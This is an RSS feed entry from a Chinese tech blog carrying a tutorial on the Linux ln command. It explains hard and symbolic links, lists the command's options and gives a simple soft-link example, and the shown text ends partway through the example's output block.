<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>IT技术干货</title>
    <description>[IT技术干货iftti.com] @KernelHacks</description>
    <link>http://iftti.com/</link>
    <atom:link href="http://iftti.com/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sun, 15 Jan 2017 16:49:01 +0800</pubDate>
    <lastBuildDate>Sun, 15 Jan 2017 16:49:01 +0800</lastBuildDate>
    <generator>Jekyll v2.2.0</generator>
    
      <item>
        <title>每天一个 Linux 命令（35）： ln 命令</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;ln是linux中又一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接.当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。&lt;/p&gt;
&lt;p&gt;1．命令格式：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f3932a759596195&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
ln [参数][源文件或目录][目标文件或目录]&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3932a759596195-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3932a759596195-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;参数&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;源文件或目录&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;目标文件或目录&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;2．命令功能：&lt;/p&gt;
&lt;p&gt;Linux文件系统中，有所谓的链接(link)，我们可以将其视为档案的别名，而链接又可分为两种 : 硬链接(hard link)与软链接(symbolic link)，硬链接的意思是一个档案可以有多个名称，而软链接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软链接却可以跨越不同的文件系统。&lt;/p&gt;
&lt;p&gt;软链接：&lt;/p&gt;
&lt;p&gt;1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式&lt;/p&gt;
&lt;p&gt;2.软链接可以 跨文件系统 ，硬链接不可以&lt;/p&gt;
&lt;p&gt;3.软链接可以对一个不存在的文件名进行链接&lt;/p&gt;
&lt;p&gt;4.软链接可以对目录进行链接&lt;/p&gt;
&lt;p&gt;硬链接:&lt;/p&gt;
&lt;p&gt;1.硬链接，以文件副本的形式存在。但不占用实际空间。&lt;/p&gt;
&lt;p&gt;2.不允许给目录创建硬链接&lt;/p&gt;
&lt;p&gt;3.硬链接只有在同一个文件系统中才能创建&lt;/p&gt;
&lt;p&gt;这里有两点要注意：&lt;/p&gt;
&lt;p&gt;第一，ln命令会保持每一处链接文件的同步性，也就是说，不论你改动了哪一处，其它的文件都会发生相同的变化；&lt;/p&gt;
&lt;p&gt;第二，ln的链接又分软链接和硬链接两种，软链接就是ln –s 源文件 目标文件，它只会在你选定的位置上生成一个文件的镜像，不会占用磁盘空间，硬链接 ln 源文件 目标文件，没有参数-s， 它会在你选定的位置上生成一个和源文件大小相同的文件，无论是软链接还是硬链接，文件都保持同步变化。&lt;/p&gt;
&lt;p&gt;ln指令用在链接文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存在的目录，则会把前面指定的所有文件或目录复制到该目录中。若同时指定多个文件或目录，且最后的目的地并非是一个已存在的目录，则会出现错误信息。&lt;/p&gt;
&lt;p&gt;3．命令参数：&lt;/p&gt;
&lt;p&gt;必要参数:&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f39336874248361&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
-b 删除，覆盖以前建立的链接

-d 允许超级用户制作目录的硬链接

-f 强制执行

-i 交互模式，文件存在则提示用户是否覆盖

-n 把符号链接视为一般目录

-s 软链接(符号链接)

-v 显示详细的处理过程&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39336874248361-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39336874248361-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39336874248361-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39336874248361-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39336874248361-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39336874248361-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39336874248361-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39336874248361-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39336874248361-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39336874248361-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39336874248361-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39336874248361-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39336874248361-13&quot;&gt;13&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39336874248361-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;b&lt;/span&gt; 删除，覆盖以前建立的链接&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39336874248361-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39336874248361-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;d&lt;/span&gt; 允许超级用户制作目录的硬链接&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39336874248361-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39336874248361-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;f&lt;/span&gt; 强制执行&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39336874248361-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39336874248361-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;i&lt;/span&gt; 交互模式，文件存在则提示用户是否覆盖&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39336874248361-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39336874248361-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;n&lt;/span&gt; 把符号链接视为一般目录&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39336874248361-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39336874248361-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;s&lt;/span&gt; 软链接&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;符号链接&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39336874248361-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39336874248361-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;v&lt;/span&gt; 显示详细的处理过程&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0013 seconds] --&gt;
&lt;p&gt;选择参数:&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f3933a554145649&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
-S “-S&amp;lt;字尾备份字符串&amp;gt; ”或 “--suffix=&amp;lt;字尾备份字符串&amp;gt;”

-V “-V&amp;lt;备份方式&amp;gt;”或“--version-control=&amp;lt;备份方式&amp;gt;”

--help 显示帮助信息

--version 显示版本信息&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3933a554145649-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3933a554145649-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3933a554145649-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3933a554145649-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3933a554145649-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3933a554145649-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3933a554145649-7&quot;&gt;7&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3933a554145649-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;S&lt;/span&gt; “&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;字尾备份字符串&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt; ”或 “&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;suffix&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;字尾备份字符串&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;”&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3933a554145649-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3933a554145649-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;V&lt;/span&gt; “&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;备份方式&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;”或“&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;control&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;备份方式&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;”&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3933a554145649-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3933a554145649-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;help&lt;/span&gt; 显示帮助信息&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3933a554145649-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3933a554145649-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;version&lt;/span&gt; 显示版本信息&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0012 seconds] --&gt;
&lt;p&gt;4．使用实例：&lt;/p&gt;
&lt;p&gt;实例1：给文件创建软链接&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f3933d906940202&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
ln -s log2013.log link2013&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3933d906940202-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3933d906940202-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;link2013&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f39340629093017&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
